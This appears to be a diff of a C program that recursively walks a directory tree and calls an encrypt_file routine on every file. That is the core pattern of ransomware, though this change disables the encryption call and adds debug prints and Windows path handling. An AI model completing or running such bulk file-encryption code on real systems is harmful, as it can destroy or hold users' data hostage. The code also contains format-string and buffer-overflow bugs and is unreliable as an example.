@@ -5,7 +5,13 @@
 #include <dirent.h>
 #include "crypt_lib.c"
 
-#define EXPECTED_PATH "./first_layer"
+#ifdef _WIN32
+  #define EXPECTED_PATH ".\\first_layer"
+  #define CURRENT_PATH "\\"
+#else
+  #define EXPECTED_PATH "./first_layer"
+  #define CURRENT_PATH "/"
+#endif
 
 void copy_string(char *target, char *source);
 int search_directory_tree(char *path);
@@ -22,11 +28,16 @@ void copy_string(char *target, char *source) {
 int search_directory_tree(char *path) {
 	struct dirent *dir_entry;
 	DIR *dr = opendir(path);
-	char current_path[3] = "/";
 	int count = 0;
-	unsigned char key = 4;
+	#ifdef _WIN32
+		int key = 16;
+		int file_key = 0;
+	#else
+		unsigned char key = 4;
+		unsigned char file_key = 8;
+	#endif
 
-	strcat(path, current_path);
+	strcat(path, CURRENT_PATH);
 
 	if (dr == NULL) {
 		printf("Couldnt open directory: %s\n", path);
@@ -35,7 +46,6 @@ int search_directory_tree(char *path) {
 
 	while ((dir_entry = readdir(dr)) != NULL) {
 		if (!(strcmp((char *)dir_entry->d_name, ".") == 0 || strcmp((char *)dir_entry->d_name, "..") == 0)) {
-			printf("Made it with: %s\n", dir_entry->d_name);
 			if (dir_entry->d_type == key) {
 				char dest[100];
 				int test, count = 0;
@@ -44,11 +54,14 @@ int search_directory_tree(char *path) {
 				printf("%s\n", dest);
 				search_directory_tree(dest);
 				count++;
-			} else if (dir_entry->d_type == 8) {
+			} else if (dir_entry->d_type == file_key) {
 				char dest[100];
 				strcpy(dest, path);
-				strcat(dest, dir_entry->d_name);
-				encrypt_file(dest);
+				printf("First copy: %s\n", dest);
+				printf("File name: %d\n", dir_entry->d_name);
+				//strcat(dest, dir_entry->d_name);
+				printf("File to be encrypted: %s\n", dest);
+				//encrypt_file(dest);
 			}
 		}
 	}
@@ -62,7 +75,6 @@ int main() {
 	char path[256];
 	const char *test_path = "/";
 	getcwd(path, sizeof(path));
-
 
 	if (strcmp(EXPECTED_PATH, path) == 0) {
 		search_directory_tree(path);
